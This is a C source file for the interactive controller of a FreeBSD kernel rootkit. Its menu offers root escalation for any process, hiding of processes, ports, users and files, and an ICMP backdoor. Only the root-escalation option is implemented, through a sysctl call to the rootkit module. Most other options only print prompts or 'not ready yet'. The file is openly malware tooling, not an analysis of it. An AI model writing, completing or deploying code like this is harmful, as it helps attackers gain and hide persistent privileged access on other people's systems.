#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //For pid_t

#define MAXLEN 4098
#define MAXARG 512

void display_welcome(){
	printf("\n                        .o8        o8o  oooo                          \n");
	printf("                       \"888        `\"'  `888                          \n");
	printf("  oooo d8b oooo  oooo   888oooo.  oooo   888  oooo    ooo ooo. .oo.   \n");
	printf("  `888\"\"8P `888  `888   d88' `88b `888   888   `88.  .8'  `888P\"Y88b  \n");
	printf("   888      888   888   888   888  888   888    `88..8'    888   888  \n");
	printf("   888      888   888   888   888  888   888     `888'     888   888  \n");
	printf("  d888b     `V88V\"V8P'  `Y8bod8P' o888o o888o     .8'     o888o o888o \n");
	printf("                                            .o..P' HARDCORE EST. 1983 \n");
	printf("                                            `Y8P'               \n\n");
}

void display_menu(){
	printf("[menu]\n");
	printf("[1] give root to process\n");
	printf("[2] hide a process\n");
	printf("[3] unhide a process\n");
	printf("[4] hide a network port\n");
	printf("[5] hide a local user\n");
	printf("[6] hide files/folders\n");
	printf("[7] set icmp backdoor path\n");
	printf("[8] send icmp trigger to host\n");
	printf("[9] uninstall rootkit\n");
	printf("[h] help\n");
	printf("[q] exit\n");
}

char* read_arg(){
    char* string;
    string = malloc(MAXARG);
    if (!string)
        exit(0);
    memset(string, 0, MAXARG);
    scanf("%512s", string);
    return string;
}

void execute(char* arg2){
    int ret;
    pid_t pid;
    char* sysctl = "/usr/sbin/sysctl";
    char* arg1 = "-w";
    char* argv[] = { sysctl, arg1, arg2, NULL}; //argv is terminated with NULL
    char* envp[] = { NULL }; //environment for the new process image. Normally NULL
    int i;
    switch(pid = fork()) {
        case 0:
            ret = execve(sysctl, argv, envp);
        default:
            waitpid(pid, &ret, 0);
            break;
    }
}

void parse_main_menu(){
    char str;
    char arg[MAXLEN];
    do {
        memset(arg, 0, MAXLEN);
        memcpy(arg, "debug.bsdrootkit.", strlen("debug.bsdrootkit."));
        printf("--> ");
        str = getchar();
        switch(str){
            case '1':
                printf("enter process id to give root: ");
                strcat(arg, "pid=");
                strcat(arg, read_arg()); //debug.bsdrootkit.pid=
                execute(arg);
                break;
            case '2':
                printf("enter process id to hide: ");
                break;
            case '3':
                printf("enter process id to unhide: ");
                break;
            case '4':
                printf("enter network port to hide: ");
                break;
            case '5':
                printf("enter username to hide: ");
                break;
            case '6':
                printf("enter string to hide on file system: ");
                break;
            case '7':
                printf("enter icmp path for backdoor: ");
                break;
            case '8':
                printf("not ready yet\n");
                break;
            case '9':
                printf("not ready yet\n");
                break;
            case 'h':
            case '?':
                display_menu();
                break;
            case 'q':
            case 'x':
                exit(0);
            default:
                printf("invalid selection\n");
                break;
        }
    }
    while(getchar() != '\n');
}

int main(){
    display_welcome();
    display_menu();
    while(1){
        parse_main_menu();
    }
}
